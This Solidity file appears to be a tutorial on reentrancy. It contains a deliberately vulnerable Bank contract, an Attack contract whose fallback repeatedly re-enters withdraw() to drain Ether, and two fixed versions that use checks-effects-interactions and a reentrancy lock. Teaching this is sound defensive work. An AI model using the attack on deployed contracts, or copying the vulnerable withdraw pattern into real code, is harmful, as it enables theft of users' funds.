// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.7.0 <0.9.0;

contract Bank {
    mapping (address => uint256) public balanceOf;

    function deposit() external payable {
        balanceOf[msg.sender] += msg.value;
    }

    function withdraw() external {
        uint256 balance = balanceOf[msg.sender];
        require(balance > 0, "Insufficient balance");
        // 转账，可能激活恶意合约的fallback，有重入风险
        (bool success, ) = msg.sender.call{value: balance}("");

        require(success, "Failed to send Ether");
        balanceOf[msg.sender] = 0;
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}

contract Attack {
    Bank public bank;

    constructor(Bank _bank) {
        bank = _bank;
    }
    // 回调函数，用于重入攻击bank合约，反复调用目标的withdraw函数
    receive() external payable {
        if (address(bank).balance >= 1 ether) {
            bank.withdraw();
        }
    }

    // 攻击函数,调用时msg.value设置为1
    function attack() external payable {
        require(msg.value == 1 ether, "Require 1 Ether to attack");
        bank.deposit{
            value: 1 ether
        }();
        bank.withdraw();
    }

    // 获取本合约的余额
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}

// 利用检查-影响-交互模式，防止重入攻击
contract GoodBank {
    mapping (address => uint256) public balanceOf;

    function deposit() external payable {
        balanceOf[msg.sender] += msg.value;
    }

    function withdraw() external {
        uint256 balance = balanceOf[msg.sender];
        require(balance > 0, "Insufficient balance");
        // 先更新余额变化，再发送eth，重入攻击的时候，balanceof已经更新为0了，不能通过上面的检查
        balanceOf[msg.sender] = 0;
        (bool success, ) = msg.sender.call {value: balance} ("");
        require(success, "Faild to send Ether");
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}

// 利用重入锁，防止攻入攻击
contract ProtectedBank {
    mapping (address => uint256) public balanceOf;
    uint256 private _status; //重入锁

    modifier nonReentrant() {
        // 在第一次调用时，_status 将是0
        require(_status == 0, "ReentrancyGrand: reentrant call");
        //在此之后，对nonReentrant的任何调用都将失败。
        _status = 1;
        _;
        // 调用结束，将_status 恢复为0;
        _status = 0;
    }

    function deposit() external payable {
        balanceOf[msg.sender] += msg.value;
    }

    function withdraw() external nonReentrant {
        uint256 balance = balanceOf[msg.sender];
        require(balance > 0, "Insufficient balance");

        (bool success, ) = msg.sender.call{value: balance} ("");
        require(success, "Faild to send Ether");

        balanceOf[msg.sender] = 0;
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}